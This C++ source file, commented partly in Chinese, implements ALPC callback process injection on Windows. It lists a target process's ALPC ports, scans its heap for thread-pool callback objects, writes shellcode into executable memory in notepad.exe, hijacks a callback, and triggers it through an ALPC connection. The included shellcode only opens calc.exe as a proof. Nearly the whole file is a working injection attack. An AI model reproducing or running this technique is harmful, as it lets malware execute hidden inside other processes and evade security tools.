/*
* 通过test_proj里的扫描句柄功能，扫描出来下面的句柄类型和num的对应关系，这里alpc对应46
explorer.exe
{
    "3": "Directory",
    "5" : "Token",
    "7" : "Process",
    "8" : "Thread",
    "11" : "IoCompletionReserve",
    "16" : "Event",
    "17" : "Mutant",
    "19" : "Semaphore",
    "20" : "Timer",
    "21" : "IRTimer",
    "24" : "WindowStation",
    "25" : "Desktop",
    "30" : "TpWorkerFactory",
    "35" : "IoCompletion",
    "36" : "WaitCompletionPacket",
    "37" : "File",
    "42" : "Section",
    "44" : "Key",
    "46" : "ALPC Port",
    "49" : "WmiGuid",
    "67" : "DxgkCompositionObject"
}
*/

// # include "ntlib_modexp\util.h"

#include <Windows.h>
#include <Shlwapi.h>
#include <Psapi.h>

#include <cstdio>
#include <vector>
#include <string>

#include "utils.h"
#include "ntStructs.h"



typedef struct _process_info_t_alpccallback {
    DWORD                     pid;             // process id
    PWCHAR                    name;            // name of process
    HANDLE                    hp;              // handle of open process
    LPVOID                    payload;         // pointer to shellcode
    DWORD                     payloadSize;     // size of shellcode
    std::vector<std::wstring> ports;           // alpc ports
} process_info_alpccallback;

#define MAX_BUFSIZ            8192
#define INFO_HANDLE_ALPC_PORT 45 // only for Windows 10. probably differs for other systems

/**
  Get a list of ALPC ports with names
*/
DWORD GetALPCPorts(process_info_alpccallback* pi)
{
    ULONG                      len = 0, total = 0;
    NTSTATUS                   status;
    LPVOID                     list = NULL;
    DWORD                      i;
    HANDLE                     hObj;
    PSYSTEM_HANDLE_INFORMATION hl;
    POBJECT_NAME_INFORMATION   objName;

    pi->ports.clear();

    // get a list of handles for the local system
    for (len = MAX_BUFSIZ;;len += MAX_BUFSIZ) 
    {
        list = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len);
        status = NtQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, list, len, &total);
        // break from loop if ok    
        if ((status)) break;
        // free list and continue
        HeapFree(GetProcessHeap(), 0, list);
    }

    hl = (PSYSTEM_HANDLE_INFORMATION)list;
    objName = (POBJECT_NAME_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 8192);

    // for each handle
    for (i = 0; i < hl->NumberOfHandles; i++) 
    {
        if (hl->Handles[i].UniqueProcessId <= 5) continue;
        
        // wprintf(L"process : %-10s\t%-5d\t%d\n", pid2name(hl->Handles[i].UniqueProcessId), hl->Handles[i].UniqueProcessId, hl->Handles[i].ObjectTypeIndex);

        // skip if process ids don't match
        if (hl->Handles[i].UniqueProcessId != pi->pid) continue;

        // skip if the type isn't an ALPC port
        // note this value might be different on other systems.
        // this was tested on 64-bit Windows 10

        //if (hl->Handles[i].ObjectTypeIndex != 45) continue;
        if (hl->Handles[i].ObjectTypeIndex != 46) continue; // 我查到的是46->alpc



        printf("[fliter] hl->Handles[i].UniqueProcessId succeed\n");
        // duplicate the handle object
        status = NtDuplicateObject(
            pi->hp, (HANDLE)hl->Handles[i].HandleValue,
            GetCurrentProcess(), &hObj, 0, 0, 0);

        // continue with next entry if we failed
        if ((status)) continue;

        // try query the name
        status = NtQueryObject(hObj,
            (OBJECT_INFORMATION_CLASS)ObjectNameInformation, objName, 8192, NULL);

        // got it okay?
        if ((status) && objName->Name.Buffer != NULL) {
            // save to list
            pi->ports.push_back(objName->Name.Buffer);
        }
        printf("GetALPCPorts func end\n");
        // close handle object
        CloseHandle(hObj);
    }

    if (pi->ports.size() == 0)
    {
        printf("pi->ports.size() == 0\n");
    }


    // free list of handles
    HeapFree(GetProcessHeap(), 0, objName);
    HeapFree(GetProcessHeap(), 0, list);
    return pi->ports.size();
}

// connect to ALPC port
BOOL ALPC_Connect(std::wstring path) 
{
    SECURITY_QUALITY_OF_SERVICE ss;
    NTSTATUS                    status;
    UNICODE_STRING              server;
    ULONG                       MsgLen = 0;
    HANDLE                      h;

    ZeroMemory(&ss, sizeof(ss));
    ss.Length = sizeof(ss);
    ss.ImpersonationLevel = SecurityImpersonation;
    ss.EffectiveOnly = FALSE;
    ss.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;

    RtlInitUnicodeString(&server, path.c_str());

    status = NtConnectPort(
        &h, 
        &server, 
        &ss, 
        NULL,
        NULL, 
        (PULONG)&MsgLen, 
        NULL, 
        NULL
    );
    
    printf("NtConnectPort status: %x\n", status);

    CloseHandle(h);

    return status?TRUE:FALSE;
}

// try inject and run payload in remote process using TCO
BOOL ALPC_deploy(process_info_alpccallback* pi, LPVOID ds, PTP_CALLBACK_OBJECT_alpccallback tco) 
{
    LPVOID             cs = NULL;
    BOOL               bInject = FALSE;
    TP_CALLBACK_OBJECT_alpccallback cpy;    // local copy of tco
    SIZE_T             wr;
    TP_SIMPLE_CALLBACK_alpccallback tp;
    DWORD              i;

    // allocate memory in remote for payload and callback parameter
    cs = VirtualAllocEx(pi->hp, NULL,
        pi->payloadSize + sizeof(PTP_SIMPLE_CALLBACK_alpccallback),
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    wprintf(L"virtual shellcode mem succeed %p\n", cs);
    if (cs != NULL) 
    {
        // write payload to remote process
        WriteProcessMemory(pi->hp, cs, pi->payload, pi->payloadSize, &wr);
        // backup TCO
        CopyMemory(&cpy, tco, sizeof(TP_CALLBACK_OBJECT_alpccallback));
        // copy original callback address and parameter
        tp.Function = cpy.CallerAddress.Function;
        tp.Context = cpy.CallerAddress.Context;
        // write callback+parameter to remote process
        WriteProcessMemory(pi->hp, (LPBYTE)cs + pi->payloadSize, &tp, sizeof(tp), &wr);
        // update original callback with address of payload and parameter
        cpy.Callback.Function = cs;
        cpy.Callback.Context = (LPBYTE)cs + pi->payloadSize;
        // update TCO in remote process
        WriteProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
        
        wprintf(L"wpm * 3 finish\n");
        // trigger execution of payload
        for (i = 0;i < pi->ports.size(); i++) 
        {
            ALPC_Connect(pi->ports[i]);
            // read back the TCO
            ReadProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
            // if callback pointer is the original, we succeeded.
            bInject = (cpy.Callback.Function == tco->Callback.Function);
            if (bInject) break;
        }
        // restore the original tco
        WriteProcessMemory(pi->hp, ds, tco, sizeof(cpy), &wr);
        // release memory for payload
        VirtualFreeEx(pi->hp, cs,
            pi->payloadSize + sizeof(tp), MEM_RELEASE);
    }
    return bInject;
}

// validates a callback object
BOOL IsValidTCO(HANDLE hProcess, PTP_CALLBACK_OBJECT_alpccallback tco)
{
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   res;

    // if it's a callback, these values shouldn't be empty  
    if (tco->CleanupGroupMember == NULL ||
        tco->Pool == NULL ||
        tco->CallerAddress.Function == NULL ||
        tco->Callback.Function == NULL) return FALSE;

    // the CleanupGroupMember should reside in read-only
    // area of image
    res = VirtualQueryEx(hProcess,
        (LPVOID)tco->CleanupGroupMember, &mbi, sizeof(mbi));

    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_READONLY)) return FALSE;
    if (!(mbi.Type & MEM_IMAGE)) return FALSE;

    // the pool object should reside in read+write memory
    res = VirtualQueryEx(hProcess,
        (LPVOID)tco->Pool, &mbi, sizeof(mbi));

    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_READWRITE)) return FALSE;

    // the caller function should reside in read+executable memory
    res = VirtualQueryEx(
        hProcess,
        (LPCVOID)tco->CallerAddress.Function, 
        &mbi, 
        sizeof(mbi)
    );

    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_EXECUTE_READ)) return FALSE;

    // the callback function should reside in read+executable memory
    res = VirtualQueryEx(
        hProcess,
        (LPCVOID)tco->Callback.Function, 
        &mbi, 
        sizeof(mbi)
    );

    if (res != sizeof(mbi)) return FALSE;
    return (mbi.Protect & PAGE_EXECUTE_READ);
}

BOOL FindEnviron(process_info_alpccallback* pi, LPVOID BaseAddress, SIZE_T RegionSize)
{
    LPBYTE               addr = (LPBYTE)BaseAddress;
    SIZE_T               pos;
    BOOL                 bRead, bFound, bInject = FALSE;
    SIZE_T               rd;
    TP_CALLBACK_OBJECT_alpccallback tco;
    WCHAR                filename[MAX_PATH];

    // scan memory for TCO
    for (pos = 0; pos < RegionSize;
        pos += (bFound ? sizeof(TP_CALLBACK_OBJECT_alpccallback) : sizeof(ULONG_PTR)))
    {
        bFound = FALSE;
        // try read TCO from writeable memory
        bRead = ReadProcessMemory(pi->hp,
            &addr[pos], &tco, sizeof(TP_CALLBACK_OBJECT_alpccallback), &rd);

        // if not read, continue
        if (!bRead) continue;
        // if not size of callback environ, continue
        if (rd != sizeof(TP_CALLBACK_OBJECT_alpccallback)) continue;

        // is this a valid TCO?
        bFound = IsValidTCO(pi->hp, &tco);
        if (bFound) {
            // obtain module name where callback resides
            GetMappedFileNameW(pi->hp, (LPVOID)tco.Callback.Function, filename, MAX_PATH);
            // filter by RPCRT4.dll
            if (StrStrIW(filename, L"RPCRT4.dll") != NULL) {
                wprintf(L"Found TCO at %p for %s\n", addr + pos, filename);
                // try run payload using this TCO
                // if successful, end scan

                bInject = ALPC_deploy(pi, addr + pos, &tco);
                if (bInject) break;
            }
        }
    }
    return bInject;
}

BOOL ALPC_inject(process_info_alpccallback* pi)
{
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;     // current address
    SIZE_T                   res;
    BOOL                     bInject = FALSE;

    // try open the target process. return on error
    pi->hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi->pid);
    if (pi->hp == NULL) return FALSE;

    // obtain a list of ALPC ports. return if none found
    if (!GetALPCPorts(pi)) {
        CloseHandle(pi->hp);
        return FALSE;
    }

    // get memory info
    GetSystemInfo(&si);

    // scan virtual memory for this process upto maximum address available    
    for (addr = 0; addr < (LPBYTE)si.lpMaximumApplicationAddress;)
    {
        res = VirtualQueryEx(pi->hp, addr, &mbi, sizeof(mbi));

        // we only want to scan the heap, 
        // but this will scan stack space too.
        // need to fix that..
        if ((mbi.State == MEM_COMMIT) &&
            (mbi.Type == MEM_PRIVATE) &&
            (mbi.Protect == PAGE_READWRITE))
        {
            bInject = FindEnviron(pi, mbi.BaseAddress, mbi.RegionSize);
            if (bInject) break;
        }
        // update address to query
        addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
    CloseHandle(pi->hp);
    return bInject;
}

int AlpcCallbackExecute() 
{
    printf("run  AlpcCallbackExecute \n");

    process_info_alpccallback pi;

    if (!SetPrivilege((PWCHAR)SE_DEBUG_NAME, TRUE))
    {
        wprintf(L"can't enable debug privilege.\n");
    }


    unsigned char shellcode[] = {
        // 构建"calc.exe"字符串到栈上
        0x48, 0x31, 0xC0,               // xor rax, rax
        0x50,                           // push rax        ; null terminator
        0x68, 0x2E, 0x65, 0x78, 0x65,   // push "exe."
        0x68, 0x63, 0x61, 0x6C, 0x63,   // push "calc"

        // 设置参数并调用
        0x48, 0x89, 0xE1,               // mov rcx, rsp    ; 第一个参数
        0x6A, 0x01,                     // push 1          ; SW_SHOWNORMAL
        0x5A,                           // pop rdx         ; 第二个参数

        // 调用WinExec
        0x48, 0xB8,                     // mov rax,
        0xEF, 0xBE, 0xAD, 0xDE,        // WinExec地址
        0xEF, 0xBE, 0xAD, 0xDE,        // (需要填充)
        0x48, 0xF7, 0xD0,               // not rax
        0xFF, 0xD0                      // call rax
    };
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    UINT64 WinExecAddr = (UINT64)GetProcAddress(hKernel32, "WinExec");
    // 填充WinExec地址
    *(UINT64*)(shellcode + 22) = ~WinExecAddr;



    // try read pic
    pi.payloadSize = sizeof(shellcode);
    pi.payload = shellcode;
    pi.name = (PWCHAR)L"notepad.exe";
    pi.pid = name2pid((PWCHAR)L"notepad.exe");

    if (pi.pid == 0) 
    {
        wprintf(L"unable to obtain process id \n");
        return 0;
    }
    wprintf(L"ALPC injection : %s\n",
        ALPC_inject(&pi) ? L"OK" : L"FAILED");
    return 0;
}

